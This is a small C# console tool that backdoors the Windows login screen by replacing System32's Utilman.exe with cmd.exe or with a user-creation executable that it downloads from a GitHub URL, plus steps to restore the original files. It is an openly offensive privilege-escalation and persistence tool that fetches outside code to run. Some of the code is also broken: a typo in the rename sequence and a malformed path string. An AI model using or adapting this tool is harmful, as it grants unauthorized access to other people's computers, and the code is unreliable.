using System.IO;
using System.Diagnostics;
using System.Net;

static void p1()
{
    Console.WriteLine("doing smth idk");
    string thingy = Console.ReadLine();
    File.Copy($"{thingy}\\System32\\cmd.exe", $"{thingy}\\Bckupthingy\\cmd.exe");
    File.Copy($"{thingy}\\System32\\Utilman.exe", $"{thingy}\\Bckupthingy\\Utilman.exe");
    File.Move($"{thingy}\\System32\\cmd.exe", $"{thingy}\\System32\\Utilmant.exe");
    File.Move($"{thingy}\\System32\\Utilman.exe", $"{thingy}\\System32\\cmd.exe");
    File.Move($"{thingy}\\System32\\cmd.exe", $"{thingy}\\System32\\Utilman.exe");
}

static void p2()
{
    Console.WriteLine("doing smth idk");
    string thingy = Console.ReadLine();
    File.Delete($"{thingy}\\System32\\Utilman.exe");
    File.Delete($"{thingy}\\System32\\cmd.exe");
    File.Copy($"{thingy}\\Bckupthingy\\cmd.exe", $"{thingy}\\System32\\cmd.exe");
    File.Copy($"{thingy}\\Bckupthingy\\Utilman.exe", $"{thingy}\\System32\\Utilman.exe");
}

static void badmethod()
{
    Console.WriteLine("Run P1 first, then P2");
    Console.WriteLine("Which one do u need to run");
    string option = Console.ReadLine();
    if (option == "P1")
    {
        p1();
    }
    else if(option == "P2")
    {
        p2();
    }
}

static void goodmethod()
{
    Console.WriteLine("Run P1 first, then P2");
    Console.WriteLine("Which one do u need to run");
    string option = Console.ReadLine();
    if (option == "P1")
    {
        gp1();
    }
    else if (option == "P2")
    {
        gp2();
    }
}

static void gp1()
{
    Console.WriteLine("doing smth idk");
    string thingy = Console.ReadLine();
    WebClient wb = new WebClient();
    wb.DownloadFile("https://github.com/Hi-doki/testthingy/raw/refs/heads/main/hjghjgh/UserCreation/bin/Debug/net8.0/UserCreation.exe", $"{thingy}\\System32\\hckr\\UserCreation.exe");
    wb.DownloadFile("https://github.com/Hi-doki/testthingy/raw/refs/heads/main/hjghjgh/UserCreation/bin/Debug/net8.0/UserCreation.dll", $"{thingy}\\System32\\hckr\\UserCreation.dll");
    File.Copy($"{thingy}\\System32\\Utilman.exe", $"{thingy}\\Bckupthingy\\Utilman.exe");
    File.Delete($"{thingy}\\System32\\Utilman.exe");
    File.Copy($"{thingy}\\System32\\hckr\\UserCreation.exe", $"{thingy}\\System32\\Utilman.exe");
    File.Copy($"{thingy}\\System32\\hckr\\UserCreation.dll", $"{thingy}\\System32\\UserCreation.dll");
}

static void gp2()
{
    Console.WriteLine("doing smth idk");
    string thingy = Console.ReadLine();
    File.Delete($"{thingy}\\System32\\Utilman.exe");
    File.Copy($"{thingy}\\Bckupthingy\\Utilman.exe", "${thingy}\\System32\\Utilman.exe");
}

Console.WriteLine("use good or bad method :)");
string idk =  Console.ReadLine();
if(idk == "good")
{
    goodmethod();
}
else if(idk == "bad")
{
    badmethod();
}